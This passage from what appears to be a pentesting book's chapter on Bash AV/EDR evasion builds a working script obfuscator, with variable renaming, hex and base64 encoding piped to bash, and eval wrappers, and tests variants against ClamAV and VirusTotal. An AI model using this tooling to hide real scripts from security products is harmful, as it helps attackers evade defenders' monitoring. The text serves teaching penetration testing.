     <span class="koboSpan" id="kobo.442.1">
      od -A n -t x1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.443.1">
     command
    </span>
    <a id="_idIndexMarker912">
    </a>
    <span class="koboSpan" id="kobo.444.1">
     is
    </span>
    <a id="_idIndexMarker913">
    </a>
    <span class="koboSpan" id="kobo.445.1">
     used to display the contents of a file or input in a specific format.
    </span>
    <span class="koboSpan" id="kobo.445.2">
     Here’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.446.1">
      the breakdown:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.447.1">
       od
      </span>
     </strong>
     <span class="koboSpan" id="kobo.448.1">
      : This stands
     </span>
     <a id="_idIndexMarker914">
     </a>
     <span class="koboSpan" id="kobo.449.1">
      for
     </span>
     <strong class="bold">
      <span class="koboSpan" id="kobo.450.1">
       octal dump
      </span>
     </strong>
     <span class="koboSpan" id="kobo.451.1">
      and is a command-line utility used for displaying data in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.452.1">
       various formats.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.453.1">
       -A n
      </span>
     </strong>
     <span class="koboSpan" id="kobo.454.1">
      : This option specifies that no address (offset) should be shown in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.455.1">
       the output.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.456.1">
       -t x1
      </span>
     </strong>
     <span class="koboSpan" id="kobo.457.1">
      : This indicates the display format.
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.458.1">
       x
      </span>
     </strong>
     <span class="koboSpan" id="kobo.459.1">
      specifies hexadecimal format, and
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.460.1">
       1
      </span>
     </strong>
     <span class="koboSpan" id="kobo.461.1">
      indicates 1-byte units.
     </span>
     <span class="koboSpan" id="kobo.461.2">
      This means the data will be displayed as two-digit hexadecimal numbers for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.462.1">
       each byte.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.463.1">
     The following code declares important variables and t
    </span>
    <a id="_idTextAnchor564">
    </a>
    <a id="_idTextAnchor565">
    </a>
    <span class="koboSpan" id="kobo.464.1">
     hen reads the original script line
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.465.1">
      by line:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.466.1">
# Main function to generate an obfuscated script
generate_obfuscated_script() {
    local original_script="$1"
    local obfuscated_script=""
    while IFS= read -r line; do</span></pre>
   <p>
    <span class="koboSpan" id="kobo.467.1">
     The next code block checks whether a line of text matches a specific pattern resembling a variable assignment in a script, extracts the variable name, and repl
    </span>
    <a id="_idTextAnchor566">
    </a>
    <a id="_idTextAnchor567">
    </a>
    <span class="koboSpan" id="kobo.468.1">
     aces it with an
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.469.1">
      obfuscated version:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.470.1">
        # Obfuscate variable assignments
        if [[ "$line" =~ ^[[:space:]]*([a-zA-Z_][a-zA-Z0-9_]*)[[:space:]]*= ]]; then
            var_name="${BASH_REMATCH[1]}"
            new_var_name=$(obfuscate_var_name)
            line="${line//$var_name/$new_var_name}"
        fi</span></pre>
   <p>
    <span class="koboSpan" id="kobo.471.1">
     The next Bash code block is designed to match lines that start with a command-like string, obfuscate
    </span>
    <a id="_idIndexMarker915">
    </a>
    <span class="koboSpan" id="kobo.472.1">
     the
    </span>
    <a id="_idIndexMarker916">
    </a>
    <span class="koboSpan" id="kobo.473.1">
     command, and then replace it within the
    </span>
    <a id="_idTextAnchor568">
    </a>
    <a id="_idTextAnchor569">
    </a>
    <span class="koboSpan" id="kobo.474.1">
     line with an
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.475.1">
      encoded represe
     </span>
     <a id="_idTextAnchor570">
     </a>
     <a id="_idTextAnchor571">
     </a>
     <span class="koboSpan" id="kobo.476.1">
      ntation:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.477.1">
       # Obfuscate commands
        if [[ "$line" =~ ^[[:space:]]*([-a-zA-Z0-9_]+) ]]; then
            cmd="${BASH_REMATCH[1]}"
            obfuscated_cmd=$(obfuscate_command "$cmd")
            line="${line//$cmd/\$(echo -e \"\x$(echo "$obfuscated_cmd" | sed 's/../\\x&amp;/g')\")}"
        fi</span></pre>
   <p>
    <span class="koboSpan" id="kobo.478.1">
     The following code specifies th
    </span>
    <a id="_idTextAnchor572">
    </a>
    <a id="_idTextAnchor573">
    </a>
    <span class="koboSpan" id="kobo.479.1">
     e original script name as
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.480.1">
      a variable:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.481.1">
        obfuscated_script+="$line"$'\n'
    done &lt; "$original_script"
    echo "$obfuscated_script"
}
original_script="original_script.sh"
obfuscated_script=$(generate_obfuscated_script "$original_script")
echo "$obfuscated_script" &gt; obfuscated_script.sh</span></pre>
   <p>
    <span class="koboSpan" id="kobo.482.1">
     Then, it declares a variable for the obfuscated script based on the return value from the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.483.1">
      generate_obfuscated_script
     </span>
    </strong>
    <span class="koboSpan" id="kobo.484.1">
     function.
    </span>
    <span class="koboSpan" id="kobo.484.2">
     The content of this variable is then saved to the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.485.1">
       obfuscated_script.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.486.1">
      file.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.487.1">
     This script provides a basic framework for generating obfuscated Bash scripts.
    </span>
    <span class="koboSpan" id="kobo.487.2">
     It includes functions for encoding strings, obfuscating variable names, and obfuscating commands.
    </span>
    <span class="koboSpan" id="kobo.487.3">
     The main
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.488.1">
      generate_obfuscated_script
     </span>
    </strong>
    <span class="koboSpan" id="kobo.489.1">
     function reads an original script, applies various obfuscation techniques, and produces an
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.490.1">
      obfuscated version.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.491.1">
     The script works by reading the original script line by line.
    </span>
    <span class="koboSpan" id="kobo.491.2">
     For each line, it checks whether some variable assignments or commands can be obfuscated.
    </span>
    <span class="koboSpan" id="kobo.491.3">
     Variable names are replaced with randomly generated names, and commands are converted into hexadecimal representations that are then decoded
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.492.1">
      at runtime.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.493.1">
     To make our
    </span>
    <a id="_idIndexMarker917">
    </a>
    <span class="koboSpan" id="kobo.494.1">
     framework
    </span>
    <a id="_idIndexMarker918">
    </a>
    <span class="koboSpan" id="kobo.495.1">
     more flexible and extensible, we can implement modular obfuscation techniques.
    </span>
    <span class="koboSpan" id="kobo.495.2">
     This approach allows us to easily add new obfuscation methods or combine existing ones in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.496.1">
      different ways.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.497.1">
     Here’s an example of how we can modify our framework to support modular obfuscation techniques.
    </span>
    <span class="koboSpan" id="kobo.497.2">
     This script can be found in the
    </span>
    <a id="_idTextAnchor574">
    </a>
    <a id="_idTextAnchor575">
    </a>
    <span class="koboSpan" id="kobo.498.1">
     GitHub repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.499.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.500.1">
       ch14_auto_obfuscate_2.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.501.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.502.1">
#!/usr/bin/en</span><a id="_idTextAnchor576"/><a id="_idTextAnchor577"/><span class="koboSpan" id="kobo.503.1">v bash
# Array to store obfuscation techniques
obfuscation_techniques=()
# Function to add an obfuscation technique
add_obfuscation_technique() {
    obfuscation_techniques+=("$1")
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.504.1">
     The preceding code block creates an array of obfuscation techniques and then provides a function to add a technique to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.505.1">
      the array.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.506.1">
# Example obfuscation techniques
obfuscate_base64() {
    echo "echo '$1' | base64 -d | bash"
}
obfuscate_hex() {
    echo "echo -e '$(echo "$1" | od -A n -t x1 | tr -d ' \n')' | bash"
}
obfuscate_eval() {
    echo "eval '$1'"
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.507.1">
     In the preceding
    </span>
    <a id="_idIndexMarker919">
    </a>
    <span class="koboSpan" id="kobo.508.1">
     code
    </span>
    <a id="_idIndexMarker920">
    </a>
    <span class="koboSpan" id="kobo.509.1">
     block, obfuscation functions
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.510.1">
      are defined.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.511.1">
# Add techniques to the array
add_obfuscation_technique obfuscate_base64
add_obfuscation_technique obfuscate_hex
add_obfuscation_technique obfuscate_eval</span></pre>
   <p>
    <span class="koboSpan" id="kobo.512.1">
     In the preceding code section, we choose our obfuscation techniques and add them to the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.513.1">
       obfuscation_techniques
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.514.1">
      array.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.515.1">
# Function to apply a random obfuscation technique
apply_random_obfuscation() {
    local content="$1"
    local technique_index=$((RANDOM % ${#obfuscation_techniques[@]}))
    local chosen_technique="${obfuscation_techniques[$technique_index]}"
    $chosen_technique "$content"
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.516.1">
     In the preceding code, the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.517.1">
      apply_random_obfuscation
     </span>
    </strong>
    <span class="koboSpan" id="kobo.518.1">
     function randomly chooses a technique, then calls the function for that technique and passes the original script content into the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.519.1">
      function call.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.520.1">
# Main function to generate an obfuscated script
generate_obfuscated_script() {
    local original_script="$1"
    local obfuscated_script=""
    while IFS= read -r line; do
        obfuscated_line=$(apply_random_obfuscation "$line")
        obfuscated_script+="$obfuscated_line"$'\n'
    done &lt; "$original_script"
    echo "$obfuscated_script"
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.521.1">
     In the preceding code block, the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.522.1">
      generate_obfuscated_script
     </span>
    </strong>
    <span class="koboSpan" id="kobo.523.1">
     function processes the
    </span>
    <a id="_idIndexMarker921">
    </a>
    <span class="koboSpan" id="kobo.524.1">
     original
    </span>
    <a id="_idIndexMarker922">
    </a>
    <span class="koboSpan" id="kobo.525.1">
     script line by line, calling the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.526.1">
      apply_random_obfuscation
     </span>
    </strong>
    <span class="koboSpan" id="kobo.527.1">
     function on each line.
    </span>
    <span class="koboSpan" id="kobo.527.2">
     The output of each function call is appended to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.528.1">
      obfuscated_script
     </span>
    </strong>
    <span class="koboSpan" id="kobo.529.1">
     variable before being printed to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.530.1">
      the terminal.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.531.1">
# Usage
original_script="original_script.sh"
obfuscated_script=$(generate_obfuscated_script "$original_script")
echo "$obfuscated_script" &gt; obfuscated_script.sh</span></pre>
   <p>
    <span class="koboSpan" id="kobo.532.1">
     In the preceding code, the previously declared functions are called, which ultimately ends with the obfuscated script being saved to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.533.1">
      a file.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.534.1">
     This updated framework introduces an array of obfuscation techniques and a function to add new techniques.
    </span>
    <span class="koboSpan" id="kobo.534.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.535.1">
      apply_random_obfuscation
     </span>
    </strong>
    <span class="koboSpan" id="kobo.536.1">
     function selects a random technique to apply to each line of the script.
    </span>
    <span class="koboSpan" id="kobo.536.2">
     This modular approach makes it easy to add new obfuscation methods or modify existing ones without changing the core logic of the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.537.1">
      script generator.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.538.1">
     To further enhance our framework, we can create a separate library of evasion functions.
    </span>
    <span class="koboSpan" id="kobo.538.2">
     This library will contain various obfuscation and evasion techniques we’ve already covered that can be imported and used in our main
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.539.1">
      script generator.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.540.1">
     To use this library in our main script generator, we can source it and incorporate the
    </span>
    <a id="_idTextAnchor578">
    </a>
    <a id="_idTextAnchor579">
    </a>
    <span class="koboSpan" id="kobo.541.1">
     evasion functions into our obfuscation techniques.
    </span>
    <span class="koboSpan" id="kobo.541.2">
     The following line of code can be used to source the Bash script containing evasion functions from an
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.542.1">
      external script:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.543.1">
source </span><a id="_idTextAnchor580"/><a id="_idTextAnchor581"/><a id="_idTextAnchor582"/><span class="koboSpan" id="kobo.544.1">ch14_evasion_library.sh</span></pre>
   <p>
    <span class="koboSpan" id="kobo.545.1">
     This is demonstrated in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.546.1">
      ch14_auto_obfuscate_4.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.547.1">
     script, whic
    </span>
    <a id="_idTextAnchor583">
    </a>
    <a id="_idTextAnchor584">
    </a>
    <span class="koboSpan" id="kobo.548.1">
     h can be found in this chapter’s GitHub repository.
    </span>
    <span class="koboSpan" id="kobo.548.2">
     Because it is very similar to previous versions, with the exception of sourcing the evasion functions from an external script, the code will not be shown in its
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.549.1">
      entirety here.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.550.1">
     This approach allows us to maintain a separate library of evasion functions, making it easier to manage, update, and extend our collection of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.551.1">
      obfuscation techniques.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.552.1">
     To make our
    </span>
    <a id="_idIndexMarker923">
    </a>
    <span class="koboSpan" id="kobo.553.1">
     obfuscation
    </span>
    <a id="_idIndexMarker924">
    </a>
    <span class="koboSpan" id="kobo.554.1">
     process more dynamic and unpredictable, we can develop a script that combines multiple evasion methods for each line or command in the original script.
    </span>
    <span class="koboSpan" id="kobo.554.2">
     This approach increases the complexity of the obfuscated script and makes it more challenging for detection systems
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.555.1">
      to analyze.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.556.1">
     Here’s an example of how we can modify our script generator to dynamically combine evasion methods.
    </span>
    <span class="koboSpan" id="kobo.556.2">
     This is demonstrated in the following s
    </span>
    <a id="_idTextAnchor585">
    </a>
    <a id="_idTextAnchor586">
    </a>
    <span class="koboSpan" id="kobo.557.1">
     cript, which can be found
    </span>
    <a id="_idTextAnchor587">
    </a>
    <a id="_idTextAnchor588">
    </a>
    <span class="koboSpan" id="kobo.558.1">
     in the GitHub repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.559.1">
      as
     </span>
     <a id="_idTextAnchor589">
     </a>
     <a id="_idTextAnchor590">
     </a>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.560.1">
       ch14_auto_obfuscate_5.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.561.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.562.1">
#!/usr/bin/env bash
source ch14_evasion_library.sh</span></pre>
   <p>
    <span class="koboSpan" id="kobo.563.1">
     The preceding code sources the code for the obfuscation functions from an
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.564.1">
      external file.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.565.1">
# Fun</span><a id="_idTextAnchor591"/><a id="_idTextAnchor592"/><span class="koboSpan" id="kobo.566.1">ction to apply multiple random obfuscation techniques
apply_multiple_obfuscations() {
    local content="$1"
    local num_techniques=$((RANDOM % 3 + 1))  # Apply 1 to 3 techniques
    for ((i=0; i&lt;num_techniques; i++)); do
        local technique_index=$((RANDOM % ${#obfuscation_techniques[@]}))
        local chosen_technique="${obfuscation_techniques[$technique_index]}"
        content=$($chosen_technique "$content")
    done
    echo "$content"
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.567.1">
     The main difference between the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.568.1">
      apply_multiple_obfuscations
     </span>
    </strong>
    <span class="koboSpan" id="kobo.569.1">
     function in the preceding code
    </span>
    <a id="_idIndexMarker925">
    </a>
    <span class="koboSpan" id="kobo.570.1">
     and
    </span>
    <a id="_idIndexMarker926">
    </a>
    <span class="koboSpan" id="kobo.571.1">
     previous versions is it can use between 1 and 3 obfuscation techniques instead of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.572.1">
      just 1.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.573.1">
# Main function to generate an obfuscated script
generate_obfuscated_script() {
    local original_script="$1"
    local obfuscated_script=""
    while IFS= read -r line; do
        if [[ -n "$line" &amp;&amp; ! </span><span class="koboSpan" id="kobo.573.2">"$line" =~ ^[[:space:]]*# ]]; then
            obfuscated_line=$(apply_multiple_obfuscations "$line")
            obfuscated_script+="$obfuscated_line"$'\n'
        else
            obfuscated_script+="$line"$'\n'
        fi
    done &lt; "$original_script"
    echo "$obfuscated_script"
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.574.1">
     In the preceding code, the original script code is processed line by line and sent to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.575.1">
      apply_multiple_obfuscations
     </span>
    </strong>
    <span class="koboSpan" id="kobo.576.1">
     function.
    </span>
    <span class="koboSpan" id="kobo.576.2">
     Once the function has processed the data and applied obfuscation, it is appended to the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.577.1">
       obfuscated_script
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.578.1">
      variable.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.579.1">
# Usage
original_script="original_script.sh"
obfuscated_script=$(generate_obfuscated_script "$original_script")
echo "$obfuscated_script" &gt; obfuscated_script.sh</span></pre>
   <p>
    <span class="koboSpan" id="kobo.580.1">
     This updated
    </span>
    <a id="_idIndexMarker927">
    </a>
    <span class="koboSpan" id="kobo.581.1">
     script
    </span>
    <a id="_idIndexMarker928">
    </a>
    <span class="koboSpan" id="kobo.582.1">
     introduces the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.583.1">
      apply_multiple_obfuscations
     </span>
    </strong>
    <span class="koboSpan" id="kobo.584.1">
     function, which applies a random number of obfuscation techniques to each line of the script.
    </span>
    <span class="koboSpan" id="kobo.584.2">
     This approach creates a more complex and varied obfuscation pattern, making it harder to identify patterns
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.585.1">
      or signatures.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.586.1">
     After generating obfuscated scripts, it’s important to test and validate them against common AV and EDR products.
    </span>
    <span class="koboSpan" id="kobo.586.2">
     This process helps ensure that our obfuscation techniques are effective and allows us to refine our methods based on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.587.1">
      the results.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.588.1">
     Here’s a basic script that demonstrates how we might approach testing our obfusc
    </span>
    <a id="_idTextAnchor593">
    </a>
    <a id="_idTextAnchor594">
    </a>
    <span class="koboSpan" id="kobo.589.1">
     ated scripts.
    </span>
    <span class="koboSpan" id="kobo.589.2">
     It can be found in the GitHub repository as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.590.1">
      ch14_auto_obfuscate_6.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.591.1">
     .
    </span>
    <span class="koboSpan" id="kobo.591.2">
     You’ll need to obtain a VirusTotal API key and replace the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.592.1">
      YOUR_API_KEY
     </span>
    </strong>
    <span class="koboSpan" id="kobo.593.1">
     string before running the script.
    </span>
    <span class="koboSpan" id="kobo.593.2">
     You can find instructions for obtaining an API key
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.594.1">
      at
     </span>
    </span>
    <a href="https://docs.virustotal.com/docs/please-give-me-an-api-key">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.595.1">
       ht
      </span>
      <span id="_idTextAnchor595">
      </span>
      <span id="_idTextAnchor596">
      </span>
      <span class="koboSpan" id="kobo.596.1">
       tps://docs.virustotal.com/docs/please-give-me-an-api-key
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.597.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.598.1">
#!/usr/bin/env bash
# Source the obfuscation script
source ch14_auto_obfuscate_1.sh
# Function to test a script against AV/EDR solutions
test_script() {
    local script="$1"
    local result=""
    # Simulate testing against different AV/EDR solutions
    # In a real scenario, you would use actual AV/EDR products or online scanning services
    result+="ClamAV: $(clamscan "$script")"$'\n'
    result+="VirusTotal: $(curl -s -F "file=@$script" ht</span><a id="_idTextAnchor597"/><a id="_idTextAnchor598"/><span class="koboSpan" id="kobo.599.1">tps://www.virustotal.com/vtapi/v2/file/scan --form apikey=YOUR_API_KEY)"$'\n'
    echo "$result"
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.600.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.601.1">
      test_script
     </span>
    </strong>
    <span class="koboSpan" id="kobo.602.1">
     function
    </span>
    <a id="_idIndexMarker929">
    </a>
    <span class="koboSpan" id="kobo.603.1">
     in
    </span>
    <a id="_idIndexMarker930">
    </a>
    <span class="koboSpan" id="kobo.604.1">
     the preceding code block is responsible for performing a scan using the ClamAV software and checking for detections on the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.605.1">
      VirusTotal website.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.606.1">
# Generate and test multiple variations of obfuscated scripts
generate_and_test() {
    local original_script="$1"
    local num_variations="$2"
    for ((i=1; i&lt;=num_variations; i++)); do
        echo "Testing variation $i"
        obfuscated_script=$(generate_obfuscated_script "$original_script")
        echo "$obfuscated_script" &gt; "obfuscated_script_$i.sh"
        test_result=$(test_script "obfuscated_script_$i.sh")
        echo "$test_result"
        echo "-------------------------"
    done
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.607.1">
     The preceding code block is responsible for generating and testing multiple iterations
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.608.1">
      of obfuscation.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.609.1">
# Usage
original_script="original_script.sh"
num_variations=5
generate_and_test "$original_script" "$num_variations"</span></pre>
   <p>
    <span class="koboSpan" id="kobo.610.1">
     This script demonstrates a basic approach to testing obfuscated scripts.
    </span>
    <span class="koboSpan" id="kobo.610.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.611.1">
      test_script
     </span>
    </strong>
    <span class="koboSpan" id="kobo.612.1">
     function
    </span>
    <a id="_idIndexMarker931">
    </a>
    <span class="koboSpan" id="kobo.613.1">
     simulates testing a
    </span>
    <a id="_idIndexMarker932">
    </a>
    <span class="koboSpan" id="kobo.614.1">
     script against different AV/EDR solutions.
    </span>
    <span class="koboSpan" id="kobo.614.2">
     In a real-world scenario, you would replace these simulations with actual scans using AV/EDR products or online
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.615.1">
      scanning services.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.616.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.617.1">
      generate_and_test
     </span>
    </strong>
    <span class="koboSpan" id="kobo.618.1">
     function generates multiple variations of obfuscated scripts and tests each one.
    </span>
    <span class="koboSpan" id="kobo.618.2">
     This allows us to see how different combinations of obfuscation techniques perform against
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.619.1">
      detection systems.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.620.1">
     The script generates a specified number of obfuscated variations and runs them through the testing process, providing results for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.621.1">
      each variation.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.622.1">
     It’s important to note that this is a simplified example for demonstration purposes.
    </span>
    <span class="koboSpan" id="kobo.622.2">
     In practice, testing against AV/EDR solutions would involve more comprehensive methods, potentially including
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.623.1">
      the following:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.624.1">
      Using a dedicated testing environment
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.625.1">
       or sandbox
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.626.1">
      Employing multiple AV/EDR products for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.627.1">
       thorough testing
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.628.1">
      Analyzing behavioral detection in addition to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.629.1">
       signature-based detection
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.630.1">
      Continuously updating the testing process as AV/EDR
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.631.1">
       solutions evolve
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.632.1">
     By systematically testing and validating our obfuscated scripts, we can refine our obfuscation techniques and ensure that they remain effective against current
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.633.1">
      detection methods.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.634.1">
     Throughout this section, we learned how to create a comprehensive system for generating, obfuscating, and
    </span>
    <a id="_idIndexMarker933">
    </a>
    <span class="koboSpan" id="kobo.635.1">
     testing evasion
    </span>
    <a id="_idIndexMarker934">
    </a>
    <span class="koboSpan" id="kobo.636.1">
     scripts in Bash.
    </span>
    <span class="koboSpan" id="kobo.636.2">
     This automated approach not only saves time but also allows for the creation of more sophisticated and effective
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.637.1">
      evasion techniques.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-220">
    <a id="_idTextAnchor599">
    </a>
    <span class="koboSpan" id="kobo.638.1">
     Summary
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.639.1">
     In this chapter, we explored techniques for evading detection by AV and EDR systems during pentests, focusing on Bash shell scripting.
    </span>
    <span class="koboSpan" id="kobo.639.2">
     We covered methods for gathering information about the security environment, basic and advanced obfuscation techniques, and strategies for automating the generation of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.640.1">
      evasive scripts.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.641.1">
     We learned how to use Bash commands to identify installed security software and active monitoring processes.
    </span>
    <span class="koboSpan" id="kobo.641.2">
     We examined various obfuscation methods, including variable name obfuscation, command substitution, and encoding techniques.
    </span>
    <span class="koboSpan" id="kobo.641.3">
     We also covered advanced evasion tactics such as timing-based evasion and transferring data using DNS.
    </span>
    <span class="koboSpan" id="kobo.641.4">
     Finally, we discussed the development of a framework for generating obfuscated Bash scripts and testing their effectiveness against common AV and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.642.1">
      EDR solutions.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.643.1">
     The value of these techniques will become apparent as more stakeholders install endpoint protection agents on Linux systems.
    </span>
    <span class="koboSpan" id="kobo.643.2">
     This will make it more difficult to pentest and your new obfuscation skills will be of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.644.1">
      great benefit.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.645.1">
     In
    </span>
    <a href="B22229_15.xhtml#_idTextAnchor600">
     <span class="No-Break">
      <em class="italic">
